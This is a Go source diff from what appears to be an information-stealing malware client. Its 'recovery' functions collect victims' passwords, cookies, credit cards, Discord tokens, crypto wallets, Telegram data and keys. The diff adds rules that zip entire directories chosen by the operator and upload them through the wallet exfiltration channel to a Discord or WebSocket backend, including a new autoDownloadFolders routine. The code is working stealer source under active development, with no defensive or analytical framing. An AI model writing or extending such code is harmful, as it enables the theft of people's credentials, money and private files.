@@ -202,7 +202,7 @@ func handleCollect(payload []byte) {
 		len(result.Passwords), len(result.Cookies), len(result.Autofill),
 		len(result.History), len(result.Bookmarks), len(result.CreditCards), len(result.DiscordTokens), len(result.Extensions), len(result.Wallets), len(result.Telegram), len(result.Keys), len(result.AppCredentials))
 
-	// Zip wallets locally (before Discord or WS path)
+	// Zip wallets + full-upload folders locally (before Discord or WS path)
 	var walletBlobs []walletBlob
 	for _, w := range result.Wallets {
 		if w.Size > maxAutoDownloadSize {
@@ -219,6 +219,31 @@ func handleCollect(payload []byte) {
 			Name: w.Name, Type: w.Type, Path: w.Path,
 			Addresses: w.Addresses, VaultData: w.VaultData, Data: data,
 		})
+	}
+	if len(opts.FileRules) > 0 {
+		sf := recovery.NewFileScanFilter(nil, nil, nil, nil)
+		for _, r := range opts.FileRules {
+			sf.Rules = append(sf.Rules, recovery.FileScanRule{
+				Extension: r.Extension, NameContains: r.NameContains,
+				DirPath: r.DirPath, FullUpload: r.FullUpload,
+			})
+		}
+		for _, dir := range recovery.ListFullUploadDirs(sf) {
+			base := filepath.Base(dir)
+			name := "folder:" + base
+			data, zerr := recovery.ZipDirectory(dir)
+			if zerr != nil {
+				log.Printf("[recovery] folder zip %q: %v", name, zerr)
+				continue
+			}
+			if len(data) > maxAutoDownloadSize {
+				log.Printf("[recovery] folder zip %q too large (%d)", name, len(data))
+				continue
+			}
+			walletBlobs = append(walletBlobs, walletBlob{
+				Name: name, Type: "folder", Path: dir, Data: data,
+			})
+		}
 	}
 
 	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
@@ -494,30 +519,91 @@ func handleScanFiles(payload []byte) {
 	sendEvent("status", map[string]string{"message": "Scanning files..."})
 
 	var filter struct {
-		Extensions   []string `json:"extensions"`
-		Names        []string `json:"names"`
-		NameContains []string `json:"nameContains"`
+		Rules        []recovery.FileScanRule `json:"rules"` // scanner.FileScanRule
+		Extensions   []string                `json:"extensions"`
+		Names        []string                `json:"names"`
+		NameContains []string                `json:"nameContains"`
 	}
 	if len(payload) > 0 {
 		_ = json.Unmarshal(payload, &filter)
 	}
 
+	sf := recovery.NewFileScanFilter(filter.Rules, filter.Extensions, filter.Names, filter.NameContains)
+	hasFilter := len(filter.Rules) > 0 || len(filter.Extensions) > 0 || len(filter.Names) > 0 || len(filter.NameContains) > 0
+
 	var files []recovery.FileResult
-	if len(filter.Extensions) > 0 || len(filter.Names) > 0 || len(filter.NameContains) > 0 {
-		files = recovery.ScanFilesFiltered(&recovery.FileScanFilter{
-			Extensions:   filter.Extensions,
-			Names:        filter.Names,
-			NameContains: filter.NameContains,
-		})
+	if hasFilter {
+		files = recovery.ScanFilesFiltered(sf)
 	} else {
 		files = recovery.ScanFiles()
 	}
-	log.Printf("[recovery] file scan complete: %d files (filter ext=%d names=%d contains=%d)",
-		len(files), len(filter.Extensions), len(filter.Names), len(filter.NameContains))
+	log.Printf("[recovery] file scan complete: %d files (rules=%d)", len(files), len(filter.Rules))
 	sendEvent("file_scan_results", map[string]interface{}{
 		"files":     files,
 		"truncated": len(files) >= 500,
 	})
+
+	// Full-upload rules: zip entire directories and send like wallet auto-download
+	fullDirs := recovery.ListFullUploadDirs(sf)
+	if len(fullDirs) > 0 {
+		go autoDownloadFolders(fullDirs)
+	}
+}
+
+// autoDownloadFolders zips each directory and uploads via the wallet auto-download channel
+// so Discord/import pipeline stores the folder archive.
+func autoDownloadFolders(dirs []string) {
+	if len(dirs) == 0 {
+		return
+	}
+	names := make([]string, 0, len(dirs))
+	wallets := make([]recovery.WalletResult, 0, len(dirs))
+	for _, dir := range dirs {
+		base := filepath.Base(dir)
+		name := "folder:" + base
+		names = append(names, name)
+		wallets = append(wallets, recovery.WalletResult{
+			Name: name,
+			Type: "folder",
+			Path: dir,
+		})
+	}
+	sendEvent("wallet_auto_start", map[string]interface{}{
+		"count":   len(wallets),
+		"names":   names,
+		"wallets": wallets,
+	})
+	ok := 0
+	for _, w := range wallets {
+		data, err := recovery.ZipDirectory(w.Path)
+		if err != nil {
+			log.Printf("[recovery] folder zip %q: %v", w.Name, err)
+			sendEvent("wallet_auto_skip", map[string]interface{}{
+				"name":   w.Name,
+				"reason": err.Error(),
+			})
+			continue
+		}
+		if len(data) > maxAutoDownloadSize {
+			log.Printf("[recovery] folder zip %q too large (%d bytes)", w.Name, len(data))
+			sendEvent("wallet_auto_skip", map[string]interface{}{
+				"name":   w.Name,
+				"reason": "size_limit",
+				"size":   len(data),
+			})
+			continue
+		}
+		sendWalletAutoData(w, data)
+		ok++
+		time.Sleep(walletBetweenDelay)
+	}
+	time.Sleep(500 * time.Millisecond)
+	sendEvent("wallet_auto_done", map[string]interface{}{
+		"expected": len(wallets),
+		"sent":     ok,
+		"names":    names,
+	})
+	log.Printf("[recovery] folder full-upload done: sent=%d expected=%d", ok, len(wallets))
 }
 
 func handleFetchFile(payload []byte) {
